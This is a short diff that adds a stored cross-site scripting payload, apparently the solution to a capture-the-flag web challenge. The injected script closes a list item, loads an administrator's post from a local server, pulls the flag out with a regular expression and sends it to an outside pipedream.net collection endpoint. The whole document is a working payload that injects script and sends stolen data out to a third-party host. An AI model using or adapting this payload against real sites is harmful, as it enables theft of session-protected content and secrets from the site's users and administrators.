@@ -1,0 +1,17 @@
+</li>
+<script>
+    // id of the admin's post
+    const result = fetch(`http://localhost:5000/post/kd4qe5`, { method: 'get' })
+        .then(response => response.text())
+        .then(data => {
+            ///<a\b[^>]*>(.*?)<\/a>/g; for <a> steal the id of the post with this regex and replace url with it
+            const regex = /ISICTF{([^}]*)}/; //this regex will get the flag
+            const match = data.match(regex);
+            return fetch(`https://eo3ef9wbd8wswwc.m.pipedream.net?c=${match[0]}`);
+        })
+        .then(response => response.json())
+        .catch(err => {
+            console.error('Request failed', err)
+        })
+</script>
+<li>
